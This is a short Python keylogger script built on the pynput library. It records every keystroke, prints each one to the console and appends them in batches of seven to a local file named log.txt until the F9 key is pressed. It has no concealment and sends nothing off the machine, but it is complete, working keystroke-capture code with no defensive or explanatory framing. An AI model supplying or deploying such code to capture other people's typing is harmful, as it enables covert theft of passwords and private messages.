from pynput.keyboard import Key, Listener

count = 0 # after certain number of keys are hit, we will add all data to the file
keys = [] #stores the keys that are pressed

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if (count >= 7): 
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "") # replace the quotation marks '' with blankspace
            if (k.find("space") > 0 or k.find("enter") > 0):
                f.write('\n') # go to the next line
            elif k.find("Key") == -1: # for system keys like Key.command Key.space or Key.enter
                f.write(k)
            

def on_release(key):
    if key == Key.f9: # stop the program
        return False #break out of the loop if we escape

#on_press and on_release are functions that will be made for listening.
with Listener(on_press=on_press, on_release = on_release) as Listener:
    Listener.join() # constantly run until we run out of the loop
